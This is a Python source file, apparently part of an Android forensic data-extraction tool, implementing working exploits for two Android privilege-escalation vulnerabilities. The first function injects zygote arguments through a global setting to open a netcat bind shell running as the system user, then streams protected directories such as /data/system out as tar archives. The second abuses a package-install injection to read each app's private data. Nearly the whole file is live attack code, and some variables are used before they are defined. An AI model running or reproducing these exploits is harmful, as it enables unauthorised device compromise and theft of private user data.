import socket
import time
import select
import shlex
import re
import zipfile
import tarfile
import subprocess
import io
import os
import sys

zytotal =0

# Exploiting CVE-2024–31317 to get system-user files (Android 9-11)
def cve_2024_31317(device, log, software, all_apps, zip_path, text, prog_text, change, mode="default"):

    # Logic adjusted according to: https://github.com/Anonymous941/zygote-injection-toolkit
    command = None
    def find_netcat():
        nc_commands = ["toybox nc", "busybox nc", "nc"]
        nc_command = None
        for command in nc_commands:
            result = device.shell(command + "--help")
            if "not found" in result:
                pass
            else:
                nc_command = command
                break
        return nc_command

    method = "old"
    command = find_netcat()
    #zygote_cmd = f"{command} -s 127.0.0.1 -p 4321 -L /system/bin/sh -l;"
    zygote_cmd = f"(settings delete global hidden_api_blacklist_exemptions;{command} -s 127.0.0.1 -p 4321 -L /system/bin/sh)&"
    raw_zygote_arguments = [
            "--runtime-args",
            "--setuid=1000",
            "--setgid=1000",
            "--runtime-flags=1",
            "--mount-external-full",
            "--setgroups=3003",
            "--nice-name=runmenetcat",
            "--seinfo=platform:isSystemServer:system_app:targetSdkVersion=29:complete",
            "--invoke-with",
            f"{zygote_cmd}",
    ]
    zygote_arguments = "\n".join(
        [f"{len(raw_zygote_arguments):d}"] + raw_zygote_arguments
    )
    if int(software.split(".")[0]) < 12:
            payload = f"LClass1;->method1(\n{zygote_arguments}"
    else:
        method = "new"
        payload = "\n" * 3000 + "A" * 5157
        payload += zygote_arguments
        payload += "," + ",\n" * 1400


    text.configure(text="Expoliting CVE-2024–31317 to acquire \"system\"-Files")
    zytotal = 0
    def dump_folder_cve(name, zipname):
        cmd = f'tar cf - {name} 2>/dev/null\nexit\n'
        cmd_bytes = cmd.encode("utf-8")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)  
        start_time = time.time()
        try:
            #print(f"[+] connecting to {host}:4321 …")
            sock.connect((host, 4321))

            sock.settimeout(timeout_seconds)

            #print(f"[+] sending command: {cmd.strip()!r}")
            text.configure(text=f"Expoliting CVE-2024–31317 to acquire \"system\"-Files\nTrying to pull {name}")
            sock.sendall(cmd_bytes)
            CHUNK = 1024 * 1024
            with zipfile.ZipFile(zipname, "a", compression=zipfile.ZIP_DEFLATED) as zf:
                class SocketReader(io.RawIOBase):
                    
                    def read(self, n=-1):
                        global zytotal
                        try:
                            sock_data = sock.recv(n if n > 0 else 65536)
                            zytotal += len(sock_data)
                            prog_text.configure(text=f"{zytotal/1024/1024:.1f} MB written")
                            return sock_data
                        except socket.timeout:
                            return b""
                
                fileobj = SocketReader()

                with tarfile.open(fileobj=fileobj, mode="r|*") as tar: 
                    for member in tar:
                        if not member.isfile():
                            continue  
                        f = tar.extractfile(member)
                        if f is None:
                            continue
                        #data = f.read()
                        #zf.writestr(member.name, data)
                        z_path = member.name
                        if mode == "prfs":
                            z_path = os.path.join("dump", member.name)

                        zi = zipfile.ZipInfo(z_path)
                        mtime = max(int(member.mtime), 315532800)
                        zi.date_time = time.localtime(mtime)[:6]

                        with zf.open(zi, "w") as zf_out:
                            while True:
                                chunk = f.read(CHUNK)
                                if not chunk:
                                    break
                                zf_out.write(chunk)
                        zf.fp.flush()
                        os.fsync(zf.fp.fileno())
        
        except Exception as e:
            log(f"Error dumping {name}: {e}")

        finally:
            try:
                sock.close()
            except Exception:
                pass
            return zytotal

    def send_and_receive(sock, cmd, idle_timeout=0.3, overall_timeout=4.0):
        if not cmd.endswith("\n"):
            cmd = cmd + "\n"
        sock.sendall(cmd.encode("utf-8"))
        chunks = []
        start = time.time()
        while True:
            if time.time() - start > overall_timeout:
                break
            r, _, _ = select.select([sock], [], [], idle_timeout)
            if r:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
            else:
                break
        return b"".join(chunks).decode("utf-8", errors="ignore")

    if command == None:
        return

    exploit_command = (
            "settings put global hidden_api_blacklist_exemptions \"" +
            payload
    )
    if method == "new":
        exploit_command += f"\n\"\nsleep 0.25\nam start -a android.settings.SETTINGS"
        device.shell("am force-stop com.android.settings")
    else:
        exploit_command += f"\n\"\nsettings delete global hidden_api_blacklist_exemptions\nsleep 2\n"
    try: device.shell(exploit_command, timeout=4)
    except: pass
    if method == "new":
        time.sleep(0.25)
        #device.shell("am start -a android.settings.SETTINGS")
        device.shell("input keyevent KEYCODE_HOME")
    else:
        time.sleep(0.25)
    device.shell("settings delete global hidden_api_blacklist_exemptions")
    if "toybox" in command:
        whoami_cmd = "toybox whoami"
    elif "busybox" in command:
        whoami_cmd = "busybox whoami"
    else:
        whoami_cmd = "whoami"
    cmd = f'''sh -c \"echo '{whoami_cmd}' | {command} localhost 4321\"'''
    z_whoami = device.shell(cmd)
    print(z_whoami)
    if "system" in z_whoami:
        log("Device is vulnerable to CVE-2024–31317")
        device.forward("tcp:4321", "tcp:4321")
        host = "localhost"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)  
        sock.connect((host, 4321))
        data_test = send_and_receive(sock=sock, cmd='ls /data')

        timeout_seconds=600

        app_uid = {}
        #device.forward("tcp:4321", "tcp:4321")

        if "/data: Permission denied" in data_test:
            for app in all_apps:
                app_user = send_and_receive(sock=sock, cmd=f"stat /data/data/{app}")
                app_user_de = send_and_receive(sock=sock, cmd=f"stat /data/user_de/0/{app}")
                uid_re = re.search(r'Uid:\s*\(\s*(\d+)\s*/', app_user)
                uid_de_re = re.search(r'Uid:\s*\(\s*(\d+)\s*/', app_user_de)
                try:
                    uid = uid_re.group(1) if uid_re else None
                except:
                    uid = None
                try:
                    uid_de = uid_re.group(1) if uid_de_re else None      
                except:
                    uid_de = None       
                if uid != "1000" and uid != None:
                    pass
                else:
                    dump_folder_cve(f"/data/data/{app}", zip_path)
                if uid_de != "1000" and uid_de != None:
                    pass
                else:
                    dump_folder_cve(f"/data/user_de/0/{app}", zip_path)
            dump_folder_cve("/data/anr", zip_path)
            dump_folder_cve("/data/app", zip_path)
            dump_folder_cve("/data/system", zip_path)
            dump_folder_cve("/system/bin", zip_path)

        else:
            dump_folder_cve("/data/", zip_path)
            dump_folder_cve("/system/bin", zip_path)
    else:
        text.configure(text="Expoliting CVE-2024–31317 failed.")
        log("Device is not vulnerable to CVE-2024–31317 (or other issue)")
    change.set(1)



# Exploiting CVE-2024–0044 to get App Files files (Android 12-13)
def cve_2024_0044(device, log, zip_path, text, prog_text, change, mode="default", selection=None):

    apps_users = device.shell("pm list packages -U")
    all_apps = []
    for line in apps_users.split('\n'):
        if line and "package:" in line:
            parts = line.split()
            if len(parts) >= 2:
                package = parts[0].replace("package:", "")
                uid = parts[1].replace("uid:", "") if "uid:" in parts[1] else None
                if selection == None:
                    all_apps.append({"package": package, "uid": uid})
                else:
                    if package in selection:
                        all_apps.append({"package": package, "uid": uid})

    text.configure(text="Expoliting CVE-2024–0044 to acquire App-Files")
    BASE_DIR = os.path.dirname(__file__)
    temp_app = os.path.join(os.path.dirname(BASE_DIR), "ressources" , "cve", "2024-0044", "cve_2024_0044.apk")
    remote_path = "/data/local/tmp/cve_2024_0044.apk"
    subprocess.run(["adb", "push", temp_app, remote_path], check=True)
    log("Pushed cve_2024_0044.apk to /data/local/tmp")

    total_bytes = 0
    app_count = 0
    CHUNK_SIZE = 1024 * 1024
    for appname in all_apps:
        app = appname["package"]
        uid = appname["uid"]
        if uid:
            text.configure(text=f"Expoliting CVE-2024–0044 to acquire App-Files\nCurrent package: {app[:56]}")
            payload = f"""@null
            victim {uid} 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null
            """
            cmd = f"""
            PAYLOAD={shlex.quote(payload)}
            pm install -i "$PAYLOAD" {remote_path}
            """
            exploit_app = device.shell(cmd)
            cmd_list = []
            cmd1 = [
                "adb", "shell",
                "run-as", "victim",
                f'tar cf - /data/data/{app} 2>/dev/null'
                ]
            cmd_list.append(cmd1)
            cmd2 = [
                "adb", "shell",
                "run-as", "victim",
                f'tar cf - /data/user_de/0/{app} 2>/dev/null'
                ]
            cmd_list.append(cmd2)
            for cmd in cmd_list: 
                proc = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    bufsize=0
                )

                with zipfile.ZipFile(zip_path, mode="a", compression=zipfile.ZIP_DEFLATED) as zf:
                    try:
                        with tarfile.open(fileobj=proc.stdout, mode="r|*") as tf:
                            for member in tf:
                                if not member.isfile():
                                    continue
                                fileobj = tf.extractfile(member)
                                if fileobj is None:
                                    continue

                                z_path = member.name
                                if mode == "prfs":
                                    z_path = os.path.join("dump", member.name)
                                
                                zi = zipfile.ZipInfo(z_path)
                                mtime = max(int(member.mtime), 315532800)
                                zi.date_time = time.localtime(mtime)[:6]

                                with zf.open(zi, "w") as zf_entry:
                                    while True:
                                        chunk = fileobj.read(CHUNK_SIZE)
                                        if not chunk:
                                            break
                                        zf_entry.write(chunk)
                                        total_bytes += len(chunk)

                                prog_text.configure(text=f"{total_bytes/1024/1024:.1f} MB written")
                                sys.stdout.flush()
                        app_count += 1
                        log(f"{' '.join(cmd)} succeeded")
                    except:
                        log(f"{' '.join(cmd)} failed or no Data")
                proc.wait()

            uninst = device.uninstall("dev.alex.cve_2024_0044")
            log(f"Uninstall dummy-app: {uninst}")
        else:
            pass

    if app_count == 0:
        text.configure(text="Expoliting CVE-2024–0044 failed")
    else:
        text.configure(text="Expoliting CVE-2024–0044 finished")
    change.set(1)